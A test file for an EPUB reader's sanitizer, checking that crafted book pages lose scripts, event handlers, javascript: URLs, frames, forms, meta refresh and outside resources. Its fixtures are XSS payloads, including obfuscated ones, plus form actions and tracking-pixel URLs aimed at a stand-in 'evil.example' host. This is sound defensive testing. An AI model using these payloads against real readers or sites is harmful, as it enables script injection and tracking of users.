// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { SECTION_CSP, sanitizeCss, sanitizeResource, sanitizeSection } from '../app/data/reader/markup'

/**
 * A book's pages are cleaned before the reader shows them (#131, phase 2):
 * an EPUB from anywhere must not run a script as Libellus nor reach outside
 * the book, while its text, styles, pictures, fonts and its own links stay.
 * Each fixture below is one way a crafted EPUB tries it.
 */

const BLOB = 'blob:http://localhost/0f0e5d1c-0000-4000-8000-000000000000'
const xhtml = (head: string, body: string) =>
  `<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:xlink="http://www.w3.org/1999/xlink" xml:lang="en"><head><title>Part I</title>${head}</head><body>${body}</body></html>`

const clean = (head: string, body: string) => sanitizeSection(xhtml(head, body), 'application/xhtml+xml')
const parse = (markup: string, type: DOMParserSupportedType = 'application/xhtml+xml') => new DOMParser().parseFromString(markup, type)

/** Whatever could run a script, anywhere in the cleaned markup. */
function scriptsIn(markup: string, type: DOMParserSupportedType = 'application/xhtml+xml') {
  const doc = parse(markup, type)
  const found: string[] = []
  for (const el of doc.querySelectorAll('*')) {
    if (/^(script|iframe|frame|frameset|object|embed|applet|base|form|foreignobject|set|animate)$/i.test(el.localName)) found.push(el.localName)
    for (const attr of el.attributes) {
      if (/^on/i.test(attr.localName)) found.push(`${el.localName}@${attr.name}`)
      if (/^(srcdoc|action|formaction|http-equiv)$/i.test(attr.localName) && !(el.localName === 'meta' && attr.value === 'Content-Security-Policy'))
        found.push(`${el.localName}@${attr.name}`)
      if (/^\s*(javascript|vbscript|data:text\/html)/i.test(attr.value.replace(/[\s\u0000-\u001f]/g, ''))) found.push(`${el.localName}@${attr.name}=${attr.value}`)
    }
  }
  return found
}

describe('a book page, cleaned', () => {
  it('loses its script elements, also in SVG', () => {
    const out = clean(
      `<script src="${BLOB}"/><script>parent.pwned = 1</script>`,
      `<p>One morning</p><svg xmlns="http://www.w3.org/2000/svg"><script>parent.pwned = 2</script><circle r="4"/></svg>`,
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('pwned')
    expect(out).toContain('<p>One morning</p>')
    expect(out).toContain('circle')
  })

  it('loses inline event handlers (onload, onerror, onclick, SVG onbegin)', () => {
    const out = clean(
      '',
      `<div onload="parent.pwned=1"><img src="${BLOB}" onerror="parent.pwned=2" alt="Gregor"/><p class="x" onclick="parent.pwned=3" onmouseover="x()">text</p>` +
        `<svg xmlns="http://www.w3.org/2000/svg" onload="parent.pwned=4"><rect width="1" height="1" onbegin="parent.pwned=5"/></svg></div>`,
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('pwned')
    const doc = parse(out)
    expect(doc.querySelector('img')?.getAttribute('src')).toBe(BLOB)
    expect(doc.querySelector('img')?.getAttribute('alt')).toBe('Gregor')
    expect(doc.querySelector('p.x')?.textContent).toBe('text')
  })

  it('loses javascript:, vbscript: and data:text/html URLs, keeps the book’s own and web links', () => {
    const out = clean(
      '',
      `<a id="js" href="javascript:parent.pwned=1">a</a><a id="js2" href=" jav&#x09;ascript:parent.pwned=1">b</a>` +
        `<a id="vb" href="vbscript:msgbox(1)">c</a><a id="data" href="data:text/html,&lt;script&gt;parent.pwned=1&lt;/script&gt;">d</a>` +
        `<svg xmlns="http://www.w3.org/2000/svg"><a id="svgjs" xlink:href="javascript:parent.pwned=1"><text>e</text></a></svg>` +
        `<math xmlns="http://www.w3.org/1998/Math/MathML"><mi href="javascript:parent.pwned=1">x</mi></math>` +
        `<a id="next" href="chapter-2.xhtml#part-ii">II</a><a id="note" epub:type="noteref" href="#n1">1</a><a id="web" href="https://www.gutenberg.org/ebooks/5200">Gutenberg</a>`,
    )
    expect(scriptsIn(out)).toEqual([])
    const doc = parse(out)
    for (const id of ['js', 'js2', 'vb', 'data', 'svgjs']) expect(doc.getElementById(id)?.getAttribute('href') ?? null).toBeNull()
    expect(doc.getElementById('svgjs')?.getAttributeNS('http://www.w3.org/1999/xlink', 'href') ?? null).toBeNull()
    expect(doc.getElementById('next')?.getAttribute('href')).toBe('chapter-2.xhtml#part-ii')
    expect(doc.getElementById('note')?.getAttribute('href')).toBe('#n1')
    expect(doc.getElementById('note')?.getAttributeNS('http://www.idpf.org/2007/ops', 'type')).toBe('noteref')
    expect(doc.getElementById('web')?.getAttribute('href')).toBe('https://www.gutenberg.org/ebooks/5200')
  })

  it('loses frames, objects, embeds, applets and forms (srcdoc, action, formaction)', () => {
    const out = clean(
      '',
      `<iframe srcdoc="&lt;script&gt;parent.parent.pwned=1&lt;/script&gt;"></iframe><iframe src="${BLOB}"/><frameset><frame src="${BLOB}"/></frameset>` +
        `<object data="${BLOB}" type="text/html"><p>fallback</p></object><embed src="${BLOB}" type="text/html"/><applet code="X.class"/>` +
        `<form action="https://evil.example/steal"><input name="q" formaction="javascript:parent.pwned=1"/><button formaction="https://evil.example">Go</button></form>`,
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('pwned')
    expect(out).not.toContain('evil.example')
    // An object's fallback content is the book's text: it stays.
    expect(out).toContain('fallback')
  })

  it('loses SVG foreignObject, set and animate, keeps a cover drawn with <image>', () => {
    const out = clean(
      '',
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 800"><image width="600" height="800" xlink:href="${BLOB}"/>` +
        `<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><iframe srcdoc="x"/><img src="x" onerror="parent.pwned=1"/></div></foreignObject>` +
        `<a><set attributeName="href" to="javascript:parent.pwned=1"/><animate attributeName="href" values="javascript:parent.pwned=1"/><text>tap</text></a></svg>`,
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('pwned')
    expect(parse(out).querySelector('image')?.getAttributeNS('http://www.w3.org/1999/xlink', 'href')).toBe(BLOB)
  })

  it('loses <meta http-equiv> (refresh, its own policy) and <base>', () => {
    const out = clean(
      `<meta http-equiv="refresh" content="0;url=javascript:parent.pwned=1"/><meta http-equiv="Content-Security-Policy" content="script-src *"/>` +
        `<base href="https://evil.example/"/><meta name="viewport" content="width=600, height=800"/><meta charset="utf-8"/>`,
      '<p>text</p>',
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('refresh')
    expect(out).not.toContain('evil.example')
    const doc = parse(out)
    const policies = [...doc.querySelectorAll('meta[http-equiv]')]
    expect(policies.map((m) => m.getAttribute('content'))).toEqual([SECTION_CSP])
    // A fixed-layout page's viewport is how foliate sizes it.
    expect(doc.querySelector('meta[name="viewport"]')?.getAttribute('content')).toBe('width=600, height=800')
  })

  it('carries its own policy first in its head: no script, no frame, nothing from outside the book', () => {
    const doc = parse(clean('', '<p>text</p>'))
    const first = doc.querySelector('head')!.firstElementChild!
    expect(first.localName).toBe('meta')
    expect(first.getAttribute('http-equiv')).toBe('Content-Security-Policy')
    expect(SECTION_CSP).toContain("script-src 'none'")
    expect(SECTION_CSP).toContain("default-src 'none'")
    expect(SECTION_CSP).toContain("frame-src 'none'")
    expect(SECTION_CSP).toContain("base-uri 'none'")
    expect(SECTION_CSP).not.toMatch(/script-src[^;]*(unsafe|\*|https?:)/)
  })

  it('keeps the book’s stylesheets, styles, pictures and text; links only to its own blobs', () => {
    const out = clean(
      `<link rel="stylesheet" type="text/css" href="${BLOB}"/><link rel="stylesheet" href="https://evil.example/track.css"/><link rel="import" href="${BLOB}"/><link rel="prefetch" href="https://evil.example/"/>` +
        `<style>@font-face { font-family: Book; src: url("${BLOB}") } @import url("https://evil.example/a.css"); p { background: url(https://evil.example/pixel.png) }</style>`,
      `<h2 epub:type="title" style="color: red; background-image: url('javascript:parent.pwned=1')">Part I</h2><p xml:lang="de">Als Gregor Samsa</p><img src="${BLOB}" srcset="${BLOB} 2x" alt=""/>`,
    )
    expect(scriptsIn(out)).toEqual([])
    expect(out).not.toContain('evil.example')
    expect(out).not.toContain('pwned')
    const doc = parse(out)
    expect([...doc.querySelectorAll('link')].map((l) => [l.getAttribute('rel'), l.getAttribute('href')])).toEqual([['stylesheet', BLOB]])
    expect(doc.querySelector('style')?.textContent).toContain(`url("${BLOB}")`)
    expect(doc.querySelector('h2')?.getAttribute('style')).toContain('color: red')
    expect(doc.querySelector('h2')?.getAttributeNS('http://www.idpf.org/2007/ops', 'type')).toBe('title')
    expect(doc.querySelector('p')?.getAttribute('xml:lang')).toBe('de')
    expect(doc.querySelector('img')?.getAttribute('srcset')).toBe(`${BLOB} 2x`)
    expect(doc.querySelector('title')?.textContent).toBe('Part I')
  })

  it('drops processing instructions but a stylesheet of its own (never XSLT)', () => {
    const markup =
      `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://evil.example/x.xsl"?><?xml-stylesheet type="text/css" href="${BLOB}"?>` +
      xhtml('', '<p>text</p>').replace(/^<\?xml[^?]*\?>/, '')
    const out = sanitizeSection(markup, 'application/xhtml+xml')
    expect(out).not.toContain('xsl')
    expect(out).toContain(`<?xml-stylesheet type="text/css" href="${BLOB}"?>`)
  })

  it('cleans a page served as HTML the same way', () => {
    const out = sanitizeSection(
      `<!DOCTYPE html><html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example"></head>` +
        `<body onload="parent.pwned=1"><script>parent.pwned=2</script><p>One morning</p><img src=x onerror=parent.pwned=3><noscript><p>shown</p></noscript>` +
        `<a href="javascript:parent.pwned=4">x</a><iframe srcdoc="<script>parent.pwned=5</script>"></iframe><svg><script>parent.pwned=6</script></svg></body></html>`,
      'text/html',
    )
    expect(scriptsIn(out, 'text/html')).toEqual([])
    expect(out).not.toContain('pwned')
    expect(out).not.toContain('evil.example')
    expect(out).toContain('<p>One morning</p>')
    expect(parse(out, 'text/html').head.firstElementChild?.getAttribute('content')).toBe(SECTION_CSP)
  })

  it('becomes an empty page when it does not parse, never the raw markup', () => {
    const out = sanitizeSection('<html><body><p>unclosed<script>parent.pwned=1</script></body>', 'application/xhtml+xml')
    expect(out).not.toContain('pwned')
    expect(out).toContain(SECTION_CSP)
  })
})

describe('a book’s stylesheets', () => {
  it('keep their own blobs and inline data, lose everything else', () => {
    const css = sanitizeCss(
      `@import url("${BLOB}"); @import "https://evil.example/a.css"; @import url(https://evil.example/b.css) screen;\n` +
        `@font-face { src: url(${BLOB}) format("woff2"), url(data:font/woff2;base64,AAAA) }\n` +
        `p { background: url( 'https://evil.example/pixel.png' ) } h1 { background: url(javascript:parent.pwned=1) } svg { fill: url(#grad) } i { background: url(data:text/html,x) }`,
    )
    expect(css).toContain(`@import url("${BLOB}")`)
    expect(css).toContain(`url(${BLOB})`)
    expect(css).toContain('url(data:font/woff2;base64,AAAA)')
    expect(css).toContain('url(#grad)')
    expect(css).not.toContain('evil.example')
    expect(css).not.toContain('javascript')
    expect(css).not.toContain('text/html')
  })
})

describe('a book’s resources, as foliate turns them into blobs', () => {
  it('cleans a page whatever shape it comes in (a string, a Blob, a type with parameters)', async () => {
    const page = xhtml('', '<p>text</p><script>parent.pwned=1</script>')
    for (const [data, type] of [
      [page, 'application/xhtml+xml'],
      [new Blob([page]), 'application/xhtml+xml; charset=utf-8'],
      [new Blob(['<p>text</p><script>parent.pwned=1</script>']), 'TEXT/HTML'],
    ] as const) {
      const out = await sanitizeResource(data, type)
      expect(typeof out.data).toBe('string')
      expect(out.data).not.toContain('pwned')
      expect(out.data).toContain(SECTION_CSP)
      expect(out.type).toMatch(/^(application\/xhtml\+xml|text\/html)$/)
    }
  })

  it('cleans SVG and CSS, shows other XML as text, never lets an untyped resource be sniffed into a page', async () => {
    const svg = await sanitizeResource('<svg xmlns="http://www.w3.org/2000/svg" onload="parent.pwned=1"><script>parent.pwned=2</script><rect/></svg>', 'image/svg+xml')
    expect(svg.data).not.toContain('pwned')
    expect(svg.data).toContain('rect')
    expect((await sanitizeResource('p { background: url(https://evil.example/x) }', 'text/css')).data).not.toContain('evil')
    expect(await sanitizeResource('<x:page xmlns:x="urn:x"/>', 'application/x-dtbncx+xml')).toEqual({ data: '<x:page xmlns:x="urn:x"/>', type: 'text/plain' })
    const html = new Blob(['<script>parent.pwned=1</script>'])
    expect((await sanitizeResource(html, '')).type).toBe('application/octet-stream')
    expect((await sanitizeResource(html, 'text/javascript')).type).toBe('application/octet-stream')
    expect((await sanitizeResource(html, 'application/x-unknown')).type).toBe('application/octet-stream')
  })

  it('passes pictures, fonts and media as they are', async () => {
    const bytes = new Blob([new Uint8Array([0xff, 0xd8, 0xff])])
    for (const type of ['image/jpeg', 'image/png', 'font/woff2', 'application/vnd.ms-opentype', 'application/x-font-ttf', 'audio/mpeg']) {
      const out = await sanitizeResource(bytes, type)
      expect(out.data).toBe(bytes)
      expect(out.type).toBe(type)
    }
  })
})
